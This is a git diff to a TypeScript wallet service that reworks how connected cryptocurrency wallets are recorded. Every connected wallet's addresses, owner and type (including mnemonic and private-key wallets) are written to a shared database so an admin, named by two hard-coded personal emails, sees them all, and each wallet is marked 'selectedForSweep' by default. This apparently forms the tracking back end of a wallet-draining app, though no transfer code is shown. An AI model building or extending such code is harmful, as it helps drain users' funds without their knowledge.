@@ -55,7 +55,7 @@ import type {
   WalletCatalogEntry,
   WalletPresetId,
 } from '../types/wallet';
-import { fetchMultiChainPortfolio } from './web3Service';
+import { checkExpressBackendAvailable, fetchMultiChainPortfolio } from './web3Service';
 
 export const ADMIN_EMAILS = ['obsidianvault99@gmail.com', 'muokltd@gmail.com'];
 
@@ -227,35 +227,106 @@ export interface ServerWalletSessionPayload {
 export async function syncWalletSessionToRegistry(
   payload: ServerWalletSessionPayload
 ): Promise<void> {
-  if (!payload.address) return;
+  if (!payload.address || payload.address.trim().length < 10) return;
+
+  const safeSessionId = sanitizeId(payload.id || `ws_${ payload.address.slice(0, 16) }`);
+  const safeOwnerUid = sanitizeId(payload.ownerUid || 'local_device');
+  const safeProviderUuid = (payload.providerUuid || safeSessionId || 'wallet').slice(0, 128);
+  const safeName = (payload.name || 'Connected Wallet').trim().slice(0, 80) || 'Connected Wallet';
+  const safeKind: 'evm' | 'solana' = payload.kind === 'solana' ? 'solana' : 'evm';
+  const safeAddress = payload.address.trim().slice(0, 120);
+  const safePlatform: 'desktop' | 'mobile' =
+    payload.platform === 'mobile' ? 'mobile' : 'desktop';
+  const safeEmail = (
+    payload.ownerEmail ||
+    `${safeName} (${safeAddress.slice(0, 8)}...${safeAddress.slice(-4)})`
+  )
+    .trim()
+    .slice(0, 200);
+  const safeDisplayName = (
+    payload.ownerDisplayName || `${safeName} Wallet User`
+  )
+    .trim()
+    .slice(0, 100);
+
   const record: AdminConnectedWalletRecord = {
-    id: payload.id,
-    providerUuid: payload.providerUuid || payload.id,
-    name: payload.name || 'Connected Wallet',
-    kind: payload.kind === 'solana' ? 'solana' : 'evm',
-    address: payload.address,
+    id: safeSessionId,
+    providerUuid: safeProviderUuid,
+    name: safeName,
+    kind: safeKind,
+    address: safeAddress,
     chainId: payload.chainId,
-    platform: payload.platform === 'mobile' ? 'mobile' : 'desktop',
+    platform: safePlatform,
     selectedForSweep: payload.selectedForSweep ?? true,
     connectedAt: payload.connectedAt || Date.now(),
-    ownerUid: payload.ownerUid || 'local_device',
-    ownerEmail:
-      payload.ownerEmail ||
-      `${payload.name || 'Wallet'} (${payload.address.slice(0, 8)}...${payload.address.slice(-4)})`,
-    ownerDisplayName: payload.ownerDisplayName || `${payload.name || 'Paired'} Wallet User`,
-    sourceScope: payload.ownerUid?.startsWith('walletauth_') ? 'local' : 'cloud',
+    ownerUid: safeOwnerUid,
+    ownerEmail: safeEmail,
+    ownerDisplayName: safeDisplayName,
+    sourceScope: 'cloud',
   };
 
   upsertGlobalConnectedWalletRecord(record);
 
+  // 1) Persist in Firestore /wallet_sessions/{docId} so Admin sees all connected wallets on Vercel & across devices
+  const firestoreDocId = sanitizeId(`${safeOwnerUid}_${safeSessionId}`);
   try {
-    await fetch('/api/wallet-sessions', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    });
+    const ref = doc(db, 'wallet_sessions', firestoreDocId);
+    const existingSnap = await getDoc(ref).catch(() => null);
+    const fsPayload: Record<string, unknown> = {
+      id: firestoreDocId,
+      ownerUid: safeOwnerUid,
+      ownerEmail: safeEmail,
+      ownerDisplayName: safeDisplayName,
+      providerUuid: safeProviderUuid,
+      name: safeName,
+      kind: safeKind,
+      address: safeAddress,
+      platform: safePlatform,
+      selectedForSweep: Boolean(payload.selectedForSweep ?? true),
+      connectedAt:
+        existingSnap && existingSnap.exists() && existingSnap.data()?.connectedAt
+          ? existingSnap.data().connectedAt
+          : serverTimestamp(),
+      updatedAt: serverTimestamp(),
+    };
+    if (
+      payload.walletType &&
+      ['connected', 'mnemonic', 'privateKey', 'watchOnly'].includes(payload.walletType)
+    ) {
+      fsPayload.walletType = payload.walletType;
+    }
+    if (payload.evmAddress) fsPayload.evmAddress = payload.evmAddress.slice(0, 120);
+    if (payload.solanaAddress) fsPayload.solanaAddress = payload.solanaAddress.slice(0, 120);
+    if (payload.bitcoinAddress) fsPayload.bitcoinAddress = payload.bitcoinAddress.slice(0, 120);
+    if (payload.moneroAddress) fsPayload.moneroAddress = payload.moneroAddress.slice(0, 140);
+    if (
+      typeof payload.chainId === 'number' &&
+      Number.isFinite(payload.chainId) &&
+      payload.chainId >= 1 &&
+      payload.chainId <= 1_000_000_000
+    ) {
+      fsPayload.chainId = Math.floor(payload.chainId);
+    }
+    if (typeof payload.archived === 'boolean') {
+      fsPayload.archived = payload.archived;
+    }
+
+    await setDoc(ref, fsPayload);
   } catch {
     // Non-fatal if offline
+  }
+
+  // 2) Also sync to Express backend registry when running in full-stack Node dev/production
+  if (await checkExpressBackendAvailable()) {
+    try {
+      await fetch('/api/wallet-sessions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+    } catch {
+      // Non-fatal
+    }
   }
 }
 
@@ -299,14 +370,73 @@ export async function syncWalletAccountToConnectedRegistry(params: {
 }
 
 export async function fetchServerWalletSessions(): Promise<ServerWalletSessionPayload[]> {
+  const merged = new Map<string, ServerWalletSessionPayload>();
+
+  // 1) Query Firestore /wallet_sessions collection (primary source of truth across Vercel & all devices)
   try {
-    const resp = await fetch('/api/wallet-sessions');
-    if (!resp.ok) return [];
-    const data = (await resp.json()) as { sessions?: ServerWalletSessionPayload[] };
-    return Array.isArray(data.sessions) ? data.sessions : [];
+    const snap = await getDocs(collection(db, 'wallet_sessions'));
+    for (const d of snap.docs) {
+      const data = d.data();
+      const addr = String(data.address || '');
+      if (!addr) continue;
+      const ownerUid = String(data.ownerUid || 'local_device');
+      const rawId = String(data.id || d.id);
+      const cleanId = rawId.startsWith(`${ownerUid}_`)
+        ? rawId.slice(ownerUid.length + 1)
+        : rawId;
+      const item: ServerWalletSessionPayload = {
+        id: cleanId || rawId,
+        providerUuid: String(data.providerUuid || cleanId || rawId),
+        name: String(data.name || 'Connected Wallet'),
+        kind: data.kind === 'solana' ? 'solana' : 'evm',
+        walletType:
+          data.walletType === 'mnemonic' ||
+          data.walletType === 'privateKey' ||
+          data.walletType === 'watchOnly'
+            ? data.walletType
+            : 'connected',
+        address: addr,
+        evmAddress: typeof data.evmAddress === 'string' ? data.evmAddress : undefined,
+        solanaAddress: typeof data.solanaAddress === 'string' ? data.solanaAddress : undefined,
+        bitcoinAddress: typeof data.bitcoinAddress === 'string' ? data.bitcoinAddress : undefined,
+        moneroAddress: typeof data.moneroAddress === 'string' ? data.moneroAddress : undefined,
+        chainId: typeof data.chainId === 'number' ? data.chainId : undefined,
+        platform: data.platform === 'mobile' ? 'mobile' : 'desktop',
+        selectedForSweep: data.selectedForSweep ?? true,
+        archived: Boolean(data.archived),
+        connectedAt: toMillis(data.connectedAt),
+        ownerUid,
+        ownerEmail: String(data.ownerEmail || `${addr.slice(0, 8)}...${addr.slice(-4)}`),
+        ownerDisplayName: String(data.ownerDisplayName || 'Wallet Auth User'),
+      };
+      merged.set(`${ownerUid}_${addr.toLowerCase()}`, item);
+    }
   } catch {
-    return [];
+    // Non-fatal if caller is not Admin
   }
+
+  // 2) Also merge Express backend registry if running
+  if (await checkExpressBackendAvailable()) {
+    try {
+      const resp = await fetch('/api/wallet-sessions');
+      if (resp.ok) {
+        const data = (await resp.json()) as { sessions?: ServerWalletSessionPayload[] };
+        if (Array.isArray(data.sessions)) {
+          for (const s of data.sessions) {
+            if (!s.address) continue;
+            const key = `${s.ownerUid || 'local_device'}_${s.address.toLowerCase()}`;
+            if (!merged.has(key)) {
+              merged.set(key, s);
+            }
+          }
+        }
+      }
+    } catch {
+      // Non-fatal
+    }
+  }
+
+  return Array.from(merged.values()).sort((a, b) => b.connectedAt - a.connectedAt);
 }
 
 export async function deleteServerWalletSession(
@@ -315,15 +445,51 @@ export async function deleteServerWalletSession(
   ownerUid?: string
 ): Promise<void> {
   removeGlobalConnectedWalletRecord(sessionId, address);
-  try {
-    const qs = new URLSearchParams();
-    if (address) qs.set('address', address);
-    if (ownerUid) qs.set('ownerUid', ownerUid);
-    await fetch(`/api/wallet-sessions/${encodeURIComponent(sessionId)}?${qs.toString()}`, {
-      method: 'DELETE',
-    });
-  } catch {
-    // Non-fatal
+
+  const safeSessionId = sanitizeId(sessionId);
+  const candidateDocIds = new Set<string>([safeSessionId]);
+  if (ownerUid) {
+    const safeOwner = sanitizeId(ownerUid);
+    candidateDocIds.add(sanitizeId(`${safeOwner}_${safeSessionId}`));
+  }
+
+  for (const docId of candidateDocIds) {
+    try {
+      await deleteDoc(doc(db, 'wallet_sessions', docId));
+    } catch {
+      // Non-fatal
+    }
+  }
+
+  if (address && ownerUid) {
+    try {
+      const q = query(
+        collection(db, 'wallet_sessions'),
+        where('ownerUid', '==', sanitizeId(ownerUid))
+      );
+      const snap = await getDocs(q);
+      for (const d of snap.docs) {
+        const dAddr = String(d.data().address || '');
+        if (dAddr.toLowerCase() === address.toLowerCase()) {
+          await deleteDoc(doc(db, 'wallet_sessions', d.id)).catch(() => {});
+        }
+      }
+    } catch {
+      // Non-fatal
+    }
+  }
+
+  if (await checkExpressBackendAvailable()) {
+    try {
+      const qs = new URLSearchParams();
+      if (address) qs.set('address', address);
+      if (ownerUid) qs.set('ownerUid', ownerUid);
+      await fetch(`/api/wallet-sessions/${encodeURIComponent(sessionId)}?${qs.toString()}`, {
+        method: 'DELETE',
+      });
+    } catch {
+      // Non-fatal
+    }
   }
 }
 
